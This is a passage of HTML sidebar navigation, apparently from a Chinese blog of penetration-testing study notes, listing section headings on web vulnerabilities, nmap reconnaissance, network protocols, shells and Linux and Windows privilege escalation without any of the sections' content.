class="nav-text">Task2 暴力破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7"><span class="nav-number">1.3.4.3.</span> <span class="nav-text">Task3 逻辑缺陷</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-Cookie%E7%AF%A1%E6%94%B9"><span class="nav-number">1.3.4.4.</span> <span class="nav-text">Task4 Cookie篡改</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8"><span class="nav-number">1.3.5.</span> <span class="nav-text">不安全直接对象引用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.3.6.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="nav-number">1.3.6.1.</span> <span class="nav-text">Task1 路径遍历</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI"><span class="nav-number">1.3.6.2.</span> <span class="nav-text">Task2 本地文件包含 - LFI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RFI"><span class="nav-number">1.3.6.3.</span> <span class="nav-text">Task3 远程文件包含 - RFI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E4%BF%AE%E5%A4%8D%E6%8E%AA%E6%96%BD"><span class="nav-number">1.3.6.4.</span> <span class="nav-text">Task4 修复措施</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-%E6%B5%8B%E8%AF%95%E6%8C%91%E6%88%98"><span class="nav-number">1.3.6.5.</span> <span class="nav-text">Task5 测试挑战</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%91%E6%88%981"><span class="nav-number">1.3.6.5.1.</span> <span class="nav-text">挑战1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%91%E6%88%982"><span class="nav-number">1.3.6.5.2.</span> <span class="nav-text">挑战2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%91%E6%88%983"><span class="nav-number">1.3.6.5.3.</span> <span class="nav-text">挑战3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%91%E6%88%984"><span class="nav-number">1.3.6.5.4.</span> <span class="nav-text">挑战4</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="nav-number">1.3.7.</span> <span class="nav-text">SSRF 服务器端请求伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-SSRF%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.3.7.1.</span> <span class="nav-text">Task1 SSRF示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-SSRF%E5%B8%B8%E8%A7%81%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.3.7.2.</span> <span class="nav-text">Task2 SSRF常见位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-SSRF%E9%98%B2%E6%8A%A4"><span class="nav-number">1.3.7.3.</span> <span class="nav-text">Task3 SSRF防护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-SSRF%E5%AE%9E%E6%88%98"><span class="nav-number">1.3.7.4.</span> <span class="nav-text">Task4 SSRF实战</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="nav-number">1.3.8.</span> <span class="nav-text">XSS 跨站脚本攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-XSS-payload"><span class="nav-number">1.3.8.1.</span> <span class="nav-text">Task1 XSS payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="nav-number">1.3.8.2.</span> <span class="nav-text">Task2 反射型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-number">1.3.8.3.</span> <span class="nav-text">Task3 存储型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS"><span class="nav-number">1.3.8.4.</span> <span class="nav-text">Task4 基于DOM的XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-XSS%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.8.5.</span> <span class="nav-text">Task5 XSS盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task6-%E5%AE%8C%E5%96%84payload"><span class="nav-number">1.3.8.6.</span> <span class="nav-text">Task6 完善payload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#level1"><span class="nav-number">1.3.8.6.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#level2"><span class="nav-number">1.3.8.6.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#level3"><span class="nav-number">1.3.8.6.3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#level4"><span class="nav-number">1.3.8.6.4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#level5"><span class="nav-number">1.3.8.6.5.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#level6"><span class="nav-number">1.3.8.6.6.</span> <span class="nav-text">level6</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task7-%E5%AE%9E%E6%88%98"><span class="nav-number">1.3.8.7.</span> <span class="nav-text">Task7 实战</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.9.</span> <span class="nav-text">命令注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="nav-number">1.4.</span> <span class="nav-text">网络安全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A2%AB%E5%8A%A8%E8%AF%86%E5%88%AB"><span class="nav-number">1.4.1.</span> <span class="nav-text">被动识别</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-whois"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">Task1 whois</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-nslookup"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">Task2 nslookup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-DNSDumpster"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">Task3 DNSDumpster</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-Shodan-io"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">Task4 Shodan.io</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F"><span class="nav-number">1.4.2.</span> <span class="nav-text">主动侦察</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">Task1 浏览器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-ping"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">Task2 ping</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E8%B7%AF%E7%94%B1%E8%B7%9F%E8%B8%AA"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">Task3 路由跟踪</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-telnet"><span class="nav-number">1.4.2.4.</span> <span class="nav-text">Task4 telnet</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.4.3.</span> <span class="nav-text">nmap探测存活主机</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E5%AD%90%E7%BD%91"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">Task1 子网</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E6%9E%9A%E4%B8%BE%E7%9B%AE%E6%A0%87"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">Task2 枚举目标</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E4%BD%BF%E7%94%A8-ARP-%E7%9A%84-Nmap-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">Task3 使用 ARP 的 Nmap 主机发现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E4%BD%BF%E7%94%A8-ICMP-%E7%9A%84-Nmap-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.4.3.4.</span> <span class="nav-text">Task4 使用 ICMP 的 Nmap 主机发现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-%E4%BD%BF%E7%94%A8-TCP-%E5%92%8C-UDP-%E7%9A%84-Nmap-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.4.3.5.</span> <span class="nav-text">Task5 使用 TCP 和 UDP 的 Nmap 主机发现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.4.</span> <span class="nav-text">nmap端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-TCP%E5%92%8CUDP%E7%AB%AF%E5%8F%A3"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">Task1 TCP和UDP端口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-TCP%E8%BF%9E%E6%8E%A5%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">Task2 TCP连接扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-UDP%E8%BF%9E%E6%8E%A5%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.4.3.</span> <span class="nav-text">Task3 UDP连接扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E8%B0%83%E6%95%B4%E8%8C%83%E5%9B%B4%E5%92%8C%E6%80%A7%E8%83%BD"><span class="nav-number">1.4.4.4.</span> <span class="nav-text">Task4 调整范围和性能</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E8%8C%83%E5%9B%B4"><span class="nav-number">1.4.4.4.1.</span> <span class="nav-text">扫描端口范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E9%80%9F%E5%BA%A6"><span class="nav-number">1.4.4.4.2.</span> <span class="nav-text">扫描速度</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-%E5%90%8E%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.4.5.</span> <span class="nav-text">Nmap 后端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E6%9C%8D%E5%8A%A1%E6%A3%80%E6%B5%8B"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">Task1 服务检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E4%BF%9D%E5%AD%98%E8%BE%93%E5%87%BA"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">Task2 保存输出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%9C%8D%E5%8A%A11"><span class="nav-number">1.4.6.</span> <span class="nav-text">协议和服务1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-telnet%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="nav-number">1.4.6.1.</span> <span class="nav-text">Task1 telnet远程登录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-HTTP"><span class="nav-number">1.4.6.2.</span> <span class="nav-text">Task2 HTTP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-FTP-%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.4.6.3.</span> <span class="nav-text">Task3 FTP 文件传输协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-SMTP-%E7%AE%80%E5%8D%95%E9%82%AE%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.4.6.4.</span> <span class="nav-text">Task4 SMTP 简单邮件传输协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-POP3-%E9%82%AE%E5%B1%80%E5%8D%8F%E8%AE%AE3"><span class="nav-number">1.4.6.5.</span> <span class="nav-text">Task5 POP3 邮局协议3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task6-IMAP-%E4%BA%92%E8%81%94%E7%BD%91%E6%B6%88%E6%81%AF%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.4.6.6.</span> <span class="nav-text">Task6 IMAP 互联网消息访问协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task7-%E6%80%BB%E7%BB%93"><span class="nav-number">1.4.6.7.</span> <span class="nav-text">Task7 总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%9C%8D%E5%8A%A12"><span class="nav-number">1.4.7.</span> <span class="nav-text">协议和服务2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E5%97%85%E6%8E%A2%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.7.1.</span> <span class="nav-text">Task1 嗅探攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E4%B8%AD%E9%97%B4%E4%BA%BA-MITM-%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.7.2.</span> <span class="nav-text">Task2 中间人 (MITM) 攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E4%BC%A0%E8%BE%93%E5%B1%82%E5%AE%89%E5%85%A8-TLS"><span class="nav-number">1.4.7.3.</span> <span class="nav-text">Task3 传输层安全 (TLS)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E5%AE%89%E5%85%A8%E5%A4%96%E5%A3%B3-SSH"><span class="nav-number">1.4.7.4.</span> <span class="nav-text">Task4 安全外壳 (SSH)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.7.5.</span> <span class="nav-text">Task5 密码攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98"><span class="nav-number">1.4.8.</span> <span class="nav-text">网络安全挑战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1"><span class="nav-number">1.4.8.1.</span> <span class="nav-text">Task1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2"><span class="nav-number">1.4.8.2.</span> <span class="nav-text">Task2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3"><span class="nav-number">1.4.8.3.</span> <span class="nav-text">Task3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4"><span class="nav-number">1.4.8.4.</span> <span class="nav-text">Task4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5"><span class="nav-number">1.4.8.5.</span> <span class="nav-text">Task5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task6"><span class="nav-number">1.4.8.6.</span> <span class="nav-text">Task6</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task7"><span class="nav-number">1.4.8.7.</span> <span class="nav-text">Task7</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.5.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFshell"><span class="nav-number">1.5.1.</span> <span class="nav-text">什么是shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-shell%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">Task1 shell类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-netcat"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">Task2 netcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-netcat-%E7%A8%B3%E5%AE%9Ashell"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">Task3 netcat 稳定shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-socat"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">Task4 socat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-socat-%E5%8A%A0%E5%AF%86shell"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">Task5 socat 加密shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task6-%E5%B8%B8%E8%A7%81shell-payload"><span class="nav-number">1.5.1.6.</span> <span class="nav-text">Task6 常见shell payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task7-%E6%8B%BF%E5%88%B0shell%E4%B8%8B%E4%B8%80%E6%AD%A5"><span class="nav-number">1.5.1.7.</span> <span class="nav-text">Task7 拿到shell下一步</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.5.2.</span> <span class="nav-text">Linux 权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">Task1 信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#hostname"><span class="nav-number">1.5.2.1.1.</span> <span class="nav-text">hostname</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#uname-a"><span class="nav-number">1.5.2.1.2.</span> <span class="nav-text">uname -a</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#proc-version"><span class="nav-number">1.5.2.1.3.</span> <span class="nav-text">&#x2F;proc&#x2F;version</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#etc-issue"><span class="nav-number">1.5.2.1.4.</span> <span class="nav-text">&#x2F;etc&#x2F;issue</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ps"><span class="nav-number">1.5.2.1.5.</span> <span class="nav-text">ps</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#env"><span class="nav-number">1.5.2.1.6.</span> <span class="nav-text">env</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#etc-passwd"><span class="nav-number">1.5.2.1.7.</span> <span class="nav-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ifconfig"><span class="nav-number">1.5.2.1.8.</span> <span class="nav-text">ifconfig</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#netstat"><span class="nav-number">1.5.2.1.9.</span> <span class="nav-text">netstat</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4"><span class="nav-number">1.5.2.1.10.</span> <span class="nav-text">查找命令</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">Task2 自动化枚举工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">Task3 内核漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-Sudo"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">Task4 Sudo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-SUID"><span class="nav-number">1.5.2.5.</span> <span class="nav-text">Task5 SUID</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task6-Capabilities"><span class="nav-number">1.5.2.6.</span> <span class="nav-text">Task6 Capabilities</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task7-Cron%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.5.2.7.</span> <span class="nav-text">Task7 Cron定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task8-PATH"><span class="nav-number">1.5.2.8.</span> <span class="nav-text">Task8 PATH</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task9-NFS"><span class="nav-number">1.5.2.9.</span> <span class="nav-text">Task9 NFS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task10-challenge"><span class="nav-number">1.5.2.10.</span> <span class="nav-text">Task10 challenge</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.5.3.</span> <span class="nav-text">Windows 权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">Task1 基本概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">Task2 信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%9A%84-Windows-%E5%AE%89%E8%A3%85"><span class="nav-number">1.5.3.2.1.</span> <span class="nav-text">无人值守的 Windows 安装</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Powershell-%E5%8E%86%E5%8F%B2"><span class="nav-number">1.5.3.2.2.</span> <span class="nav-text">Powershell 历史</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BF%9D%E5%AD%98%E7%9A%84-Windows-%E5%87%AD%E6%8D%AE"><span class="nav-number">1.5.3.2.3.</span> <span class="nav-text">保存的 Windows 凭据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#IIS-%E9%85%8D%E7%BD%AE"><span class="nav-number">1.5.3.2.4.</span> <span class="nav-text">IIS 配置</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%8E%E8%BD%AF%E4%BB%B6%E6%A3%80%E7%B4%A2%E5%87%AD%E8%AF%81%EF%BC%9APuTTY"><span class="nav-number">1.5.3.2.5.</span> <span class="nav-text">从软件检索凭证：PuTTY</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">Task3 计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E5%A7%8B%E7%BB%88%E5%AE%89%E8%A3%85%E6%8F%90%E5%8D%87"><span class="nav-number">1.5.3.4.</span> <span class="nav-text">Task4 始终安装提升</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-%E6%BB%A5%E7%94%A8%E6%9C%8D%E5%8A%A1%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE"><span class="nav-number">1.5.3.5.</span> <span class="nav-text">Task5 滥用服务错误配置</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows-%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.5.3.5.1.</span> <span class="nav-text">Windows 服务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90"><span class="nav-number">1.5.3.5.2.</span> <span class="nav-text">服务可执行文件的不安全权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AA%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="nav-number">1.5.3.5.3.</span> <span class="nav-text">未加引号的服务路径</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="nav-number">1.5.3.5.4.</span> <span class="nav-text">不安全的服务权限</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task6-%E6%BB%A5%E7%94%A8%E5%8D%B1%E9%99%A9%E7%9A%84%E7%89%B9%E6%9D%83"><span class="nav-number">1.5.3.6.</span> <span class="nav-text">Task6 滥用危险的特权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows-%E6%9D%83%E9%99%90"><span class="nav-number">1.5.3.6.1.</span> <span class="nav-text">Windows 权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SeBackup-SeRestore%E6%8F%90%E6%9D%83"><span class="nav-number">1.5.3.6.2.</span> <span class="nav-text">SeBackup &#x2F; SeRestore提权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SeTakeOwnership%E6%8F%90%E6%9D%83"><span class="nav-number">1.5.3.6.3.</span> <span class="nav-text">SeTakeOwnership提权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SeImpersonate-SeAssignPrimaryToken%E6%8F%90%E6%9D%83"><span class="nav-number">1.5.3.6.4.</span> <span class="nav-text">SeImpersonate &#x2F; SeAssignPrimaryToken提权</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task7-%E6%BB%A5%E7%94%A8%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="nav-number">1.5.3.7.</span> <span class="nav-text">Task7 滥用易受攻击的软件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%93%E8%A1%A5%E4%B8%81%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="nav-number">1.5.3.7.1.</span> <span class="nav-text">打补丁的软件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6%EF%BC%9ADruva-inSync-6-6-3"><span class="nav-number">1.5.3.7.2.</span> <span class="nav-text">案例研究：Druva inSync 6.6.3</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task8-%E4%B8%93%E4%B8%9A%E5%B7%A5%E5%85%B7"><span class="nav-number">1.5.3.8.</span> <span class="nav-text">Task8 专业工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WinPEAS"><span class="nav-number">1.5.3.8.1.</span> <span class="nav-text">WinPEAS</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PrivescCheck"><span class="nav-number">1.5.3.8.2.</span> <span class="nav-text">PrivescCheck</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WES-NG-Windows-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BB%BA%E8%AE%AE%E5%99%A8"><span class="nav-number">1.5.3.8.3.</span> <span class="nav-text">WES-NG Windows 漏洞利用建议器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Metasploit"><span class="nav-number">1.5.3.8.4.</span> <span class="nav-text">Metasploit</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task9-%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.3.9.</span> <span class="nav-text">Task9 